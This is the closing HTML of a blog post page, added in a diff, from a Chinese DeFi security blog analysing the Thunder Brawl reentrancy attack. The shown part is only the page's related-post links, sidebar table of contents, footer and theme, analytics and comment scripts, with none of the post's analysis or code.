+      <div class="popular-posts-title"><a href="\2024\01\16\Defi安全-Orion-Protocol攻击事件分析\" rel="bookmark">Defi安全--Orion Protocol攻击事件分析</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2024\01\21\Defi安全-Sentiment-Protocol攻击事件分析\" rel="bookmark">Defi安全--Sentiment Protocol攻击事件分析</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2023\12\19\EGD价格操纵攻击原理分析\" rel="bookmark">EGD价格操纵攻击原理分析--phalcon+etherscan</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\2023\12\19\EGD价格操纵攻击foundry复现\" rel="bookmark">EGD价格操纵攻击foundry复现</a></div>
+    </li>
+  </ul>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Emmanuel
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://emmanuelwh.github.io/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" title="Defi安全-Thunder Brawl攻击事件分析">https://emmanuelwh.github.io/2024/02/28/Defi安全-Thunder-Brawl攻击事件分析/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Defi%E5%AE%89%E5%85%A8/" rel="tag"># Defi安全</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" rel="tag"># 安全事件分析</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/21/Defi%E5%AE%89%E5%85%A8-Sentiment-Protocol%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" rel="prev" title="Defi安全--Sentiment Protocol攻击事件分析">
+      <i class="fa fa-chevron-left"></i> Defi安全--Sentiment Protocol攻击事件分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Thunder-Brawl%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">1. Thunder Brawl重入攻击事件相关信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Thunder-Brawl%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">2. Thunder Brawl重入攻击事件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Thunder-Brawl%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">3. Thunder Brawl攻击合约</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Emmanuel"
+      src="/images/hometown.jpg">
+  <p class="site-author-name" itemprop="name">Emmanuel</p>
+  <div class="site-description" itemprop="description">XJTUer 区块链安全小白 <br> 坚信AI变革生产力  Web3变革生产关系</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Emmanuelwh" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Emmanuelwh" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/emmanuel-87-70" title="Zhihu → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;emmanuel-87-70" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>Zhihu</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/m0_53689197?type=blog" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_53689197?type&#x3D;blog" rel="noopener" target="_blank"><i class="far fa-keyboard fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=2071923556" title="Music → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;2071923556" rel="noopener" target="_blank"><i class="fab fa-itunes-note fa-fw"></i>Music</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+      <!-- require APlayer -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+        <!-- require MetingJS-->
+        <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> 
+      <!--网易云-->   
+        <div class="aplayer" 
+          data-id="8940934500" 
+          data-server="netease" 
+          data-type="playlist" 
+          data-fixed="false" 
+          data-autoplay="true" 
+          data-list-folded="false"
+          data-mutex="true"
+          data-order="random" 
+          data-loop="all"
+          data-volume="0.4" 
+          data-theme="#FADFA3" 
+          date-preload="auto" > 
+        </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+
+  </aside>
+
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Emmanuel</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">33k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:01</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.bootcss.com/valine/1.4.4/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = '';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'gAD7uMtmIxpFIANjozCCYSex-gzGzoHsz',
+      appKey     : '7NgcIb6pbECV8SqPakVb2uc1',
+      placeholder: "聊五毛钱的天嘛？|ω･)و ̑̑༉",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"position":"right","width":250,"height":400,"hOffset":5,"vOffset":50},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
